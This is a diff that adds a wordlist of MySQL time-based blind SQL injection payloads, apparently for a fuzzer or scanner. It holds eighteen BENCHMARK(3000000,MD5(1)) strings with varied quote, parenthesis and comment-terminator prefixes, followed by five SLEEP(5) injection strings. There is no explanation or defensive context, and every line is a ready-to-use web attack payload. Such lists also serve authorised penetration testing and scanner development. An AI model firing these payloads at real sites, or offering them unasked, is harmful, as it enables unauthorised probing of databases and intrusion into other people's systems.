@@ -1,0 +1,23 @@
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
